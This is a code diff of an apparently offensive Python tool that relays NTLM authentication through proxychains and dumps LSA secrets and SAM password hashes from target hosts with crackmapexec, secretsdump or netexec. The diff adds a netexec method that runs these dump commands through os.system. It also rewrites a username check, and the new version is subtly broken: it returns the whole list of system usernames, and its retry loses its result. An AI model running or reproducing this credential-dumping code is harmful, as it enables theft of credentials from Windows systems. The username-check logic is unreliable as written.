@@ -69,26 +69,34 @@ def mt_execute(username, ip, method, secretsdump_path, local_uname):
         os.system('sudo -u {} proxychains crackmapexec smb {} -u {} -p \'\' -d {} --lsa'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
         print('sudo -u {} proxychains crackmapexec smb {} -u {} -p \'\' -d {} --sam'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
         os.system('sudo -u {} proxychains crackmapexec smb {} -u {} -p \'\' -d {} --sam'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
+    elif method == 'netexec':
+        print('sudo -u {} proxychains netexec smb {} -u {} -p \'\' -d {} --lsa'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
+        os.system('sudo -u {} proxychains netexec smb {} -u {} -p \'\' -d {} --lsa'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
+        print('sudo -u {} proxychains netexec smb {} -u {} -p \'\' -d {} --sam'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
+        os.system('sudo -u {} proxychains netexec smb {} -u {} -p \'\' -d {} --sam'.format(local_uname, ip, username.split('/')[1], username.split('/')[0]))
 
-    with open('dumped_ips', 'a') as f:
+    with open('{}/dumped_ips'.format(cwd), 'a') as f:
         f.write(ip + '\n')
         f.close()
 
 
 def check_uname():
-    username = input('Enter your username: ')
+    given_username = input('Enter your attacker machine username: ')
     with open('/etc/passwd', 'r') as f:
         dat = f.readlines()
         f.close()
-    passwd_usernames = ''
+    # this gets all the usernames in /etc/passwd into a list ex ['root', 'www-data', 'kali']
+    passwd_usernames = []
     for item in dat:
-        passwd_usernames = passwd_usernames + ' ' + str(item.split(':')[0])
+        passwd_usernames.append(str(item.split(':')[0]))
+    
+    # iterates through the passwd_usernames list and sees if the given username is equal to any in it
+    for name in passwd_usernames:
+        if given_username == name:
+            return passwd_usernames
 
-    if username in passwd_usernames and username != '' and username != ' ':
-        return username
-    else:
-        print('{} Username does not exist in /etc/passwd'.format(red_minus))
-        check_uname()
+    print('{} Username does not exist in /etc/passwd'.format(red_minus))
+    check_uname()
 
 if __name__ == '__main__':
 
@@ -97,7 +105,7 @@ if __name__ == '__main__':
         sys.exit(1)
 
     parser = argparse.ArgumentParser(add_help=True)
-    parser.add_argument('-method', action='store', choices=['crackmapexec', 'secretsdump'], default='crackmapexec', help='Method used to dump LSA Secrets and SAM Default=crackmapexec')
+    parser.add_argument('-method', action='store', choices=['crackmapexec', 'secretsdump', 'netexec'], default='crackmapexec', help='Method used to dump LSA Secrets and SAM Default=crackmapexec')
     parser.add_argument('-sdp', action='store', help='Path to secretsdump.py file (only used if -method is secretsdump) Example -sdp /opt/impacket/examples/secretsdump.py')
     parser.add_argument('-threads', action='store', type=int, default=1, help='Number of threads to use Default=1 I recommend useing 1 as ntlmrelayx will sometimes lose a relay if you use more than 1 idk why')
 
@@ -112,15 +120,15 @@ if __name__ == '__main__':
 
     config_check()
     local_uname = ''
-    if options.method == 'crackmapexec':
+    if options.method == 'crackmapexec' or options.method == 'netexec':
         local_uname = check_uname()
 
     if options.method == 'secretsdump' and os.path.isfile(options.sdp) == False:
         print('Missing secretsdump.py')
         sys.exit(1)
 
-    if os.path.isfile('dumped_ips'):
-        with open('dumped_ips', 'r') as f:
+    if os.path.isfile('{}/dumped_ips'.format(cwd)):
+        with open('{}/dumped_ips'.format(cwd), 'r') as f:
             dat = f.read()
             dumped_ips = dat.split('\n')
 
